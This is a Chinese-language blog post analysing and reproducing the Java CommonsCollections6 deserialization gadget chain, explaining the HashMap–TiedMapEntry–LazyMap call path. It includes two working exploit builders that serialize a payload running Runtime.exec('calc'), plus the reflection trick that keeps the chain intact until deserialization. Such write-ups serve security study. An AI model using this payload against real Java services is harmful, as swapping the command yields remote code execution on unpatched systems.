---
title: CommonsCollections6
date: 2021-12-18 14:46:58
categories:
- Java
tags:
- Deserialization exploit chain
toc: true
notshow: true
---
# 流程图

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639749549133-5581e661-9864-4ca2-95d1-88fc9fa1b36c.jpeg)



# 分析与复现





## 0x00 概述



CommonsCollection6 是 Common-collections 中没有受到 JDK 版本限制的一条链。



### 利用版本



CommonsCollections 3.1 - 3.2.1



### 限制



JDK版本：暂无限制



## 0x01 前置准备

环境搭建与 CC1 中的环境搭建一致。具体可以参考：

https://www.yuque.com/dr34d/ziu16u/xuq88g#UmX6n



## 0x02 触发点

CC6 与 CC1 在LazyMap.get 之后的调用链是相同的，因此触发点不变。不同的是，CC6 使用了 HashMap 作为利用链的起点。

## 0x03 调用链

在 URLDNS 中，我们可以知道 HashMap 在反序列化时会调用 hashCode 方法，但是 hashCode 之后怎么串联起来，需要寻找新的类。目前这条链如图所示：

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639748725273-6326e22b-61f9-4fd1-bf2c-a425165fa111.png)

寻找方法可以使用 IDEA 手动寻找，也可以使用一些自动化的工具。

利用链的作者使用的是 TiedMapEntry 。

我们可以看到 TiedMapEntry.hashCode 方法中调用了 getValue 方法。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639749264237-2b99ab5f-37f5-4553-907f-aac868da2c02.png)

getValue 方法中调用了 map.get 方法。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639749313856-0894b411-b7c3-4bc4-b8ed-82cda6558fa7.png)

map 在构造器中初始化，因此我们可控。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639749341593-1d9ac5db-b1d6-49cd-867a-72375db9815b.png)

所以这样看，这条链其实也比较简单。

将 HashMap 的元素设置为 TiedMapEntry ，TiedMapEntry.map 设置为 LazyMap，就能够将整条链串起来。

利用链如下：

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639749565382-47e44be3-82e5-4f31-baa4-ac137f94f338.png)

exp 编写如下：

```java
    public static void testCC6() throws Exception{
        ChainedTransformer chainedTransformer = new ChainedTransformer(
                new Transformer[]{
                        new ConstantTransformer(
                                Runtime.class
                        ),
                        new InvokerTransformer(
                                "getMethod",
                                new Class[]{String.class,Class[].class},
                                new Object[]{"getRuntime",null}
                        ),
                        new InvokerTransformer(
                                "invoke",
                                new Class[]{Object.class,Object[].class},
                                new Object[]{null,null}
                        ),
                        new InvokerTransformer(
                                "exec",
                                new Class[]{String.class},
                                new Object[]{"calc"}
                        )
                });

        HashMap<String,String> map = new HashMap<>();
        map.put("entrySet","aaa");

        LazyMap lazyMap = (LazyMap) LazyMap.decorate(map,chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "aaa");

        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(tiedMapEntry,"bbb");
        serialize(hashMap);
    }
```

在 URLDNS 利用链中我们知道，在编写 HashMap 相关的 exp 时，按照上面的写法，hashMap.put 中会调用 hash 方法

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639750108377-360f5c1a-b4d6-4820-8ac9-e555d6e89ba4.png)

hash 方法会进一步调用 key.hashCode，这里 key 为 TideMapEntry，因此会弹出计算器。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639750157529-f2edabea-d96f-4536-9646-39c282d4366c.png)

另外，调用了 LazyMap.get 方法后，会将对应的 key（上面的 exp 中为 "aaa"）和 value put 到 map 中。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639750827403-4f11c9f3-50cc-46c2-8787-d47dc63789f6.png)

如果在序列化前不将这个键值对删除掉的话，在反序列化再次调用 get 方法时，这个 key 已经在 map 里面了，则不会调用 transform 方法。

至于序列化时是否执行，可改可不改。编写工具时当然不希望有干扰，可以进行相应修改，即在 put 前将利用链破坏掉，put 后，序列化前再将完整的链还原，这里是先将任意 ConstantTransformer 赋值到 LazyMap 中，尔后在赋值为 chainedTransformer，注意需要使用反射的方法来修改属性。

综上修改后的 exp：

```java
    public static void testCC6() throws Exception{
        ChainedTransformer chainedTransformer = new ChainedTransformer(
                new Transformer[]{
                        new ConstantTransformer(
                                Runtime.class
                        ),
                        new InvokerTransformer(
                                "getMethod",
                                new Class[]{String.class,Class[].class},
                                new Object[]{"getRuntime",null}
                        ),
                        new InvokerTransformer(
                                "invoke",
                                new Class[]{Object.class,Object[].class},
                                new Object[]{null,null}
                        ),
                        new InvokerTransformer(
                                "exec",
                                new Class[]{String.class},
                                new Object[]{"calc"}
                        )
                });

        HashMap<String,String> map = new HashMap<>();
        map.put("entrySet","aaa");

        LazyMap lazyMap = (LazyMap) LazyMap.decorate(map,new ConstantTransformer("aaa"));

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "aaa");

        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(tiedMapEntry,"bbb");

        Class c = Class.forName("org.apache.commons.collections.map.LazyMap");
        Field factoryField = c.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap,chainedTransformer);

        lazyMap.remove("aaa");
        serialize(hashMap);
    }
```

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1639751382386-b6e810ed-4878-4d16-88ff-528490e8fcce.png)



# 参考资料


- [Java反序列化CommonsCollections篇(二)](https://www.bilibili.com/video/BV1no4y1U7E1?from=search&seid=1275269546208917278&spm_id_from=333.337.0.0) 
- [Commons-Collections 1-7 利用链分析](http://wjlshare.com/archives/1535)
